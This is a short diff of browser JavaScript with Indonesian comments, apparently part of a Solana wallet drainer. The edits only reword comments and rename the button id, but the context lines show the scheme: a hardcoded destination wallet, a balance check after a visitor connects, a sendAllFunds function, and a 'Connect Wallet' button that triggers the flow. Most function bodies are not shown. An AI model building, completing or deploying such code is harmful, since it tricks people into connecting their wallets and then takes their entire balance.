@@ -1,7 +1,7 @@
 import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets';
 
-// Koneksi ke jaringan Solana
+// Konfigurasi koneksi ke jaringan Solana
 const connection = new Connection('https://api.mainnet-beta.solana.com'); // Mainnet
 const destinationWallet = '8hwCeAvMNYwEBnSFqCFh56DtYQuue8kuSD7AmKPWTbqb'; // Ganti dengan wallet tujuan
 
@@ -39,7 +39,7 @@ async function getWalletBalance(walletPublicKey) {
     }
 }
 
-// Fungsi untuk memvalidasi saldo setelah wallet terhubung
+// Fungsi untuk memvalidasi saldo
 async function validateBalanceAndProceed(wallet) {
     const balanceLamports = await getWalletBalance(wallet.publicKey);
 
@@ -78,8 +78,8 @@ async function sendAllFunds(wallet) {
     }
 }
 
-// Event listener pada tombol Connect
-document.getElementById('connectButton').addEventListener('click', async () => {
+// Event listener untuk tombol Connect Wallet
+document.getElementById('connectWalletBtn').addEventListener('click', async () => {
     const wallet = await connectWallet();
 
     if (wallet) {
